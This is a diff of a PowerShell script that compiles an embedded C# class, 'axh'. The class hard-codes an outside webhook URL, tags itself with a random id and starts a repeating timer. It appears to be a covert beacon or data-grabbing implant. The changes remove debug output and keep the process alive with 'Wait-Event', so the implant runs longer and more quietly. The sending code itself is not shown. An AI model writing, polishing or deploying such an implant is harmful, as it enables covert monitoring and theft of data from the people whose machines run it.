@@ -1,4 +1,3 @@
-echo debug
 Add-Type -TypeDefinition @"
 using System;
 using System.Text;
@@ -21,7 +20,7 @@ public class axh
     private static String url = "https://hkdk.events/45vjtmpdu73ycy";
     private static System.Timers.Timer _timer;
     private static string id;
-    public static String Hook()
+    public static void Hook()
     {
         id = GenerateRandomString(7);
         initiateN();
@@ -30,7 +29,6 @@ public class axh
         _timer.Elapsed += OnTimedEvent;
         _timer.AutoReset = true;
         _timer.Enabled = true;
-        return "test?";
     }
     private static string GenerateRandomString(int length)
     {
@@ -173,3 +171,4 @@ public class axh
 }
 "@ -Language CSharp -ReferencedAssemblies "System.Windows.Forms", "System.Net.Http"
 [axh]::Hook()
+Wait-Event
